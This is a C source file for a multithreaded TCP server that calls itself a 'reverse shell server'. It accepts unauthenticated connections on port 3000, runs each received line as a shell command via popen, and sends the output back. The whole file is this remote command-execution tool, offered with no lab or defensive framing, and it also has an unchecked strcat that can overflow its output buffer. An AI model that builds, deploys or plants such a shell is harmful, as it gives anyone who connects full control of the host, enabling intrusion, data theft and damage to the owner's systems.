#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>

#define PORT 3000
#define BUFFER_SIZE 1024
#define FINISHER "***" // End-of-message delimiter

// Function to check if a string is empty or contains only whitespace
int is_empty_or_whitespace(const char *str)
{
    if (str == NULL)
        return 1;

    while (*str)
    {
        if (!isspace((unsigned char)*str))
            return 0;
        str++;
    }
    return 1;
}

void *client_handler(void *arg)
{
    int client_sock = *(int *)arg;
    free(arg);
    char command[BUFFER_SIZE];
    char output[BUFFER_SIZE * 2];
    ssize_t num_read;

    while (1)
    {
        memset(command, 0, sizeof(command));
        num_read = recv(client_sock, command, sizeof(command) - 1, 0);
        if (num_read <= 0)
        {
            perror("recv failed or connection closed");
            break;
        }
        command[num_read] = '\0';

        // Skip command execution if it's empty.
        if (is_empty_or_whitespace(command))
        {
            const char *empty_msg = "No command provided.\n";
            send(client_sock, empty_msg, strlen(empty_msg), 0);
            continue;
        }

        // Check for "exit" command
        if (strncmp(command, "exit", 4) == 0)
        {
            break;
        }

        // Handling the "cd" command (special case)
        if (strncmp(command, "cd ", 3) == 0)
        {
            char *dir = command + 3;
            if (dir[0] == '\0')
            {
                dir = getenv("HOME");
            }
            if (chdir(dir) != 0)
            {
                snprintf(output, sizeof(output), "cd: %s: %s\n", dir, strerror(errno));
            }
            else
            {
                char cwd[1024];
                if (getcwd(cwd, sizeof(cwd)) != NULL)
                {
                    snprintf(output, sizeof(output), "Directory changed to: %s\n", cwd);
                }
                else
                {
                    snprintf(output, sizeof(output), "cd: error retrieving current directory\n");
                }
            }
            // Append delimiter even for commands with output
            strcat(output, FINISHER);
            send(client_sock, output, strlen(output), 0);
            continue;
        }

        // Execute general commands via popen
        FILE *fp = popen(command, "r");
        if (fp == NULL)
        {
            snprintf(output, sizeof(output), "Failed to execute command.\n");
        }
        else
        {
            memset(output, 0, sizeof(output));
            size_t total = 0;
            char temp[BUFFER_SIZE];
            while (fgets(temp, sizeof(temp), fp) != NULL)
            {
                size_t len = strlen(temp);
                if (total + len < sizeof(output))
                {
                    strcat(output, temp);
                    total += len;
                }
                else
                {
                    break;
                }
            }
            pclose(fp);
        }

        // Even if output is empty, ensure the delimiter is sent
        strcat(output, FINISHER);

        if (send(client_sock, output, strlen(output), 0) < 0)
        {
            perror("send failed");
            break;
        }
    }

    close(client_sock);
    pthread_exit(NULL);
}

int main()
{
    int server_sock, *client_sock_ptr;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_addr_len = sizeof(client_addr);

    if ((server_sock = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        perror("socket creation failed");
        exit(EXIT_FAILURE);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    memset(&(server_addr.sin_zero), '\0', 8);

    if (bind(server_sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0)
    {
        perror("bind failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    if (listen(server_sock, 5) < 0)
    {
        perror("listen failed");
        close(server_sock);
        exit(EXIT_FAILURE);
    }

    printf("Reverse shell server listening on port %d...\n", PORT);

    while (1)
    {
        int *client_sock = malloc(sizeof(int));
        if ((*client_sock = accept(server_sock, (struct sockaddr *)&client_addr, &client_addr_len)) < 0)
        {
            perror("accept failed");
            free(client_sock);
            continue;
        }
        printf("Connection accepted from %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

        pthread_t tid;
        if (pthread_create(&tid, NULL, client_handler, client_sock) != 0)
        {
            perror("Failed to create thread");
            close(*client_sock);
            free(client_sock);
            continue;
        }
        pthread_detach(tid);
    }

    close(server_sock);
    return 0;
}